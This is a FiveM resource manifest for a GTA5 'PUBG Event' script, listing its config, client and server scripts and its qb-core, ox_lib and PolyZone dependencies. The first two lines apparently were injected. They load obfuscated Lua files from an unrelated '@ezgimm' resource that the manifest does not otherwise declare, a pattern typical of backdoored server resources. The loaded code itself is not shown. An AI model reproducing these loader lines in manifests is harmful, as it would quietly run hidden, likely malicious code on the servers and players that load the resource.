shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA
lua54 'yes' 
fx_version 'cerulean'
game 'gta5'

author 'GGDev'
description 'PUBG Event'
version '1.0.0'

shared_scripts {
    '@qb-core/shared/locale.lua',
    'config.lua'
}

server_scripts {
    '@ox_lib/init.lua',
    '@PolyZone/server.lua',
    'server.lua'
}

client_scripts {
    '@ox_lib/init.lua',
   '@PolyZone/client.lua',
  '@PolyZone/BoxZone.lua',
  '@PolyZone/EntityZone.lua',
  '@PolyZone/CircleZone.lua',
  '@PolyZone/ComboZone.lua',
    'client.lua'
}

dependencies {
    'qb-core',  
    'ox_lib',   
    'PolyZone'  
}

escrow_ignore {
    'config.lua'
}